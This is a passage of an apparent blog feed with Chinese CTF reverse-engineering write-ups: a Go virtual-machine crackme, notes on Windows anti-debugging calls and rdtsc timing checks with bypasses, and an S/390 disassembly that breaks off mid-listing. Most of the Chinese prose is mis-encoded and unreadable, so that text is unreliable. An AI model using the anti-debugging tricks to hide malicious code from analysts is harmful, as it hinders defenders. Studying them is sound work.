        <content type="html"><![CDATA[<p>åœ¨æœ€å10åˆ†é’Ÿæ‹¿åˆ°è¿™ä¸ªé¢˜çš„äºŒè¡€ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ã€‚<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/image-20201106230503034.png" alt="image-20201106230503034"></p><p>ä»æ–‡ä»¶åå­—åŠç¨‹åºä¸­çš„å­—ç¬¦ä¸²ï¼š<strong>runtime~</strong>å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªgoè¯­è¨€å†™çš„ç¨‹åºï¼Œç„¶åä½¿ç”¨IDAGolangHelperè„šæœ¬è¿˜åŸç¨‹åºçš„ç¬¦å·è¡¨ã€‚è¿™ä¸‹ä»å‡½æ•°åç§°å¯ä»¥æå¤§çš„å‡å°‘å·¥ä½œé‡ã€‚</p><p>æ‰¾åˆ°mainå‡½æ•°ï¼Œç®€å•åˆ†æä¸€ä¸‹å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºç±»å‹çš„é¢˜ç›®ï¼š</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/image-20201106210626460-1604738087809.png" alt="image-20201106210626460"></p><p>æå–å‡ºopcodeè¡¨ï¼š</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/2.png" alt="image-20201106210922720"></p><p>çŸ¥é“äº†æ“ä½œç çš„åŠŸèƒ½ï¼Œä»7çš„æ•°æ®ä¸ªæ•°å¯ä»¥çŸ¥é“æˆ‘ä»¬è¦è¾“å…¥çš„å­—ç¬¦é•¿åº¦æ˜¯24ï¼Œ<strong>5 ~</strong>å…¶å®å°±æ˜¯ä¸€ä¸ªå–ä¸‹ä¸ªæ•°æ®å€¼ã€‚ç„¶åå¯¹äºcode = 4,ï¼Œ1*1çš„æ“ä½œè™½ç„¶å€¼æ²¡æ”¹å˜ä½†å…¶å®åœ¨æ”¹å˜å–æ•°æ®indexã€‚è€Œå¯¹äºæ“ä½œç 5 1 4ç®—æ˜¯å¤šä½™çš„ç±»ä¼¼èŠ±æŒ‡ä»¤å§ã€‚å¦‚æœå¯¹è¿™ä¸ªååˆ†ç†Ÿæ‚‰ä¹‹åå¯ä»¥ç›´æ¥æ ¹æ®opcodeå’Œå¯†æ–‡é€†å‘flagçš„ï¼Œä½†æˆ‘è¿˜æ˜¯è°ƒè¯•å•æ­¥è°ƒè¯•æ¥åšçš„ï¼š</p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/3.png" alt="image-20201106212942973"></p><p><img src="/2020/11/07/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/4.png" alt="image-20201106212508124"></p><p>æ•´ç†äº†å‰é¢å‡ ä¸ªå­—ç¬¦çš„ç¬”è®°ï¼šåé¢è¿˜æœ‰å¯¹æ•°æ®ä¹˜æ³•åŠ æ³•çš„æ“ä½œï¼Œç›´æ¥è°ƒè¯•ç€èµ°å°±æ˜¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input[<span class="number">0</span>],input[<span class="number">1</span>] = -input[<span class="number">1</span>], input[<span class="number">2</span>] = -input[<span class="number">2</span>], input[<span class="number">3</span>]*input[<span class="number">4</span>]*input[<span class="number">5</span>],</span><br><span class="line">f,l,a,g,&#123;I</span><br><span class="line">ä»å¼€å§‹çš„å‡ ä¸ªå­—ç¬¦æ“ä½œè°ƒè¯•å¾—å‡ºç»“æœflag&#123;,åˆä»input[<span class="number">3</span>]*input[<span class="number">4</span>]*input[<span class="number">5</span>] == E1CA5h, ç®—å‡ºinput[<span class="number">5</span>] = <span class="string">'I'</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼šè°ƒè¯•æ—¶æ¯æ¬¡è¾“å…¥ä¸€ä¸ªé€’å¢çš„æ•°æ®ï¼Œè¿™æ ·è¿˜åœ¨è°ƒè¯•çš„dumpçª—å£çœ‹æˆ‘ä»¬çš„æ•°æ®æœ‰æ²¡æœ‰å˜åŒ–ã€‚</p><p>æœ€åè°ƒè¯•å®Œä¸€éå¾—åˆ°flagï¼š<strong>flag{I_am_the_last_one}</strong></p><p>èµ›åæˆ‘ä¹Ÿç›´æ¥æ ¹æ®æ“ä½œç èµ°äº†ä¸€éç¨‹åºçš„æµç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">5</span>, <span class="number">1635</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2222</span>, <span class="number">8</span>, <span class="number">0</span>]</span><br><span class="line"><span class="comment">//7:input, 2:-, 3:+, 4:*</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åè°ƒè¯•è®°å½•</title>
      <link href="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>ä»Šåé‡åˆ°çš„åè°ƒè¯•éƒ½è®°å½•åœ¨æ­¤ï¼Œæœ‰äº›å…·ä½“å†…éƒ¨åŸç†åé¢å†æ¥è¡¥ã€‚<a id="more"></a></p><h3 id="NtQueryInformationProcesså‡½æ•°"><a href="#NtQueryInformationProcesså‡½æ•°" class="headerlink" title="NtQueryInformationProcesså‡½æ•°"></a>NtQueryInformationProcesså‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *NtQueryInformationProcessPtr)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       HANDLE processHandle,<span class="comment">//è¿›ç¨‹å¥æŸ„</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PROCESSINFOCLASS processInformationClass,<span class="comment">//ä¿¡æ¯ç±»å‹</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PVOID processInformation,<span class="comment">//ç¼“å†²åŒºï¼Œå‡½æ•°è¿”å›å€¼å­˜å…¥çš„åœ°å€ç©ºé—´ã€‚</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       ULONG processInformationLength,<span class="comment">//ç¼“å†²åŒºçš„å¤§å°</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">       PULONG returnLength)</span></span>;</span><br><span class="line"><span class="comment">//å½“ç¬¬äºŒä¸ªå‚æ•°ä¸º7æ—¶å¯ä»¥ç”¨æ¥æŸ¥çœ‹è¿›ç¨‹çš„è°ƒè¯•ç«¯å£ã€‚å½“è¿›ç¨‹è¢«è°ƒè¯•æ—¶è¿”å›-1ï¼Œå¦åˆ™è¿”å›å…¶å®ƒå€¼ã€‚</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ç”±äºè¿™æ˜¯ä¸€ä¸ªæœªå…¬å¼€çš„APIï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨LoadLibraryå’ŒGetProceAddressçš„æ–¹æ³•è·å–è°ƒç”¨åœ°å€ã€‚è¿™é‡Œè´´ä¸Šé‡åˆ°çš„ç¨‹åºä¸­ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥æ£€æµ‹è°ƒè¯•çš„å®ä¾‹ï¼š</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105170711386.png" alt="image-20201105170711386"></p><p>æ‰€ä»¥æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥æ ¹æ®dword_404468çš„å€¼åˆ¤æ–­è¿›ç¨‹æ˜¯å¦å¤„äºè°ƒè¯•ã€‚</p><h3 id="NtSetInformationThreadå‡½æ•°"><a href="#NtSetInformationThreadå‡½æ•°" class="headerlink" title="NtSetInformationThreadå‡½æ•°"></a>NtSetInformationThreadå‡½æ•°</h3><p>ä¸ä¸Šé¢ä¸€ä¸ªå‡½æ•°ç±»ä¼¼çš„ç”¨æ³•ï¼Œä¹Ÿéœ€è¦ä½¿ç”¨LoadLibraryå’ŒGetProceAddressçš„æ–¹æ³•è·å–è°ƒç”¨åœ°å€ã€‚</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105171431630.png" alt="image-20201105171431630"></p><p>è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œå¦‚æœåœ¨ç¬¬äºŒä¸ªå‚æ•°é‡ŒæŒ‡å®š0x11è¿™ä¸ªå€¼ï¼ˆæ„æ€æ˜¯ThreadHideFromDebuggerï¼‰ï¼Œç­‰äºå‘Šè¯‰æ“ä½œç³»ç»Ÿï¼Œå°†æ‰€æœ‰é™„åŠ çš„è°ƒè¯•å™¨ç»Ÿç»Ÿå–æ¶ˆæ‰ï¼Œå³é€€å‡ºè°ƒè¯•çŠ¶æ€ã€‚</p><h3 id="IsProcessorFeaturePresentå‡½æ•°"><a href="#IsProcessorFeaturePresentå‡½æ•°" class="headerlink" title="IsProcessorFeaturePresentå‡½æ•°"></a>IsProcessorFeaturePresentå‡½æ•°</h3><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201105172140986.png" alt="image-20201105172140986"></p><h3 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h3><p>CheckRemoteDebuggerPresentå®é™…ä¸Šè°ƒç”¨äº†ntdllé‡Œé¢çš„ZwQueryInformationProcessæ¥æ£€æµ‹ï¼Œå’Œä¸Šé¢è®°å½•çš„ç¬¬ä¸€ä¸ªå‡½æ•°ä¸€æ ·ï¼Œå…¶ç¬¬äºŒä¸ªå‚æ•°æ˜¯7ï¼Œè¢«å®šä¹‰ä¸ºProcessDebugPortã€‚</p><p>å®ƒä¸ä»…å¯ä»¥æ¢æµ‹ç³»ç»Ÿå…¶ä»–è¿›ç¨‹æ˜¯å¦è¢«è°ƒè¯•ï¼Œé€šè¿‡ä¼ é€’è‡ªèº«è¿›ç¨‹å¥æŸ„è¿˜å¯ä»¥æ¢æµ‹è‡ªèº«æ˜¯å¦è¢«è°ƒè¯•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckDebug</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    BOOL ret;  </span><br><span class="line">    CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  </span><br><span class="line">    <span class="keyword">return</span> ret;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¦‚æœæœ‰è°ƒè¯•å™¨å­˜åœ¨åˆ™retçš„å€¼ä¸ºé0</span></span><br></pre></td></tr></table></figure><h3 id="æ—¶é’Ÿæ£€æµ‹ï¼ˆrdtscï¼‰"><a href="#æ—¶é’Ÿæ£€æµ‹ï¼ˆrdtscï¼‰" class="headerlink" title="æ—¶é’Ÿæ£€æµ‹ï¼ˆrdtscï¼‰"></a>æ—¶é’Ÿæ£€æµ‹ï¼ˆrdtscï¼‰</h3><p>è¿™ä¸ªåè°ƒè¯•ä¸»è¦å°±æ˜¯æ£€æŸ¥2ä¸ªæŒ‡ä»¤æ‰§è¡Œä¹‹é—´ç›¸å·®çš„æ—¶é—´ï¼Œå¦‚æœæˆ‘ä»¬è°ƒè¯•å•æ­¥æ‰§è¡Œçš„æ—¶é—´è‚¯å®šæ˜¯å¤§äºæ­£å¸¸æ—¶é—´çš„ã€‚</p><p>å¯¹æŠ—è¿™ç§åè°ƒè¯•ï¼Œå¯ä»¥æ‰“patchï¼Œä¹Ÿå¯ä»¥æŠŠæ–­ç‚¹ä¸‹åœ¨å®ƒåé¢ï¼Œå…·ä½“è¿˜æ˜¯æƒ…å†µè€Œå®šã€‚</p><p>ä¸€ä¸ªå®ä¾‹ï¼Œé€šè¿‡åœ¨å®ƒåé¢ä¸‹æ–­å¯¹æŠ—ã€‚</p><p><img src="/2020/11/05/%E5%8F%8D%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20201213172904993.png" alt="image-20201213172904993"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020æ¹–æ¹˜æ¯</title>
      <link href="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/"/>
      <url>/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>æ€»çš„æ¥è¯´è¿™æ¬¡çš„reéƒ½è¿˜å¥½ã€‚<a id="more"></a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easyZ"><a href="#easyZ" class="headerlink" title="easyZ"></a>easyZ</h3><p>ä¸€ä¸ªä¸å¤ªå¸¸è§æ¶æ„<strong>S/390</strong>çš„ç¨‹åºï¼Œidaåå‘ç°ä¸èƒ½åæ±‡ç¼–ï¼ŒæŠ¥é”™ã€‚ã€‚</p><p>ç„¶ååœ¨linuxä¸‹ä½¿ç”¨qemuæ¥æ¨¡æ‹Ÿäº†ç¨‹åºçš„è¿è¡Œï¼Œç¡®å®šå…³é”®å­—ç¬¦ä¸²ï¼š<strong>Please input your string:</strong></p><p>åœ¨æ‰€ç»™çš„hex.txtæœç´¢è¯¥å­—ç¬¦ä¸²å®šä½å…³é”®å­—ç¬¦ä¸²çš„åœ°å€ï¼Œå†åˆ°dis.txtæ–‡ä»¶ä¸­æœç´¢è¯¥åœ°å€å®šä½åˆ°å…³é”®æ±‡ç¼–æŒ‡ä»¤åœ°å€å¤„ã€‚</p><p>æ¥ç€ä½¿ç”¨qemuåœ¨gdbä¸€ä¸ªç«¯å£è¿›è¡Œä¸‹æ–­è°ƒè¯•éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/image-20201102131400699.png" alt></p><p>å‰©ä¸‹å°±æ˜¯æŸ¥çœ‹æ–‡æ¡£<a href="http://www.tachyonsoft.com/inst390m.htm" target="_blank" rel="noopener">z Architectureæ±‡ç¼–æ‰‹å†Œ</a>æ¥æ‰‹æ’¸æ±‡ç¼–ä»£ç ã€‚æœ€åæ•´ç†å…³é”®å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1000910</span>:eb bf f0 <span class="number">58</span> <span class="number">00</span> <span class="number">24</span> stmg%r11,%r15,<span class="number">88</span>(%r15)  <span class="comment">//ç¬¬ä¸€ä¸ªå…³é”®å‡½æ•°</span></span><br><span class="line"><span class="number">1000916</span>:e3 f0 ff <span class="number">50</span> ff <span class="number">71</span> lay%r15,<span class="number">-176</span>(%r15)  <span class="comment">//lea</span></span><br><span class="line"><span class="number">100091</span>c:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000920</span>:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">24</span> stg%r2,<span class="number">160</span>(%r11)    <span class="comment">//r2 = r11+160  input</span></span><br><span class="line"><span class="number">1000926</span>:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">04</span> lg%r2,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100092</span>c:c0 e5 ff ff ff <span class="number">02</span> brasl%r14,<span class="number">0x1000730</span></span><br><span class="line"><span class="number">1000932</span>:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2 <span class="comment">//mov</span></span><br><span class="line"><span class="number">1000936</span>:a7 <span class="number">1f</span> <span class="number">00</span> <span class="number">20</span>       cghi%r1,<span class="number">32</span>   <span class="comment">//cmp len(input), 32</span></span><br><span class="line"><span class="number">100093</span>a:a7 <span class="number">84</span> <span 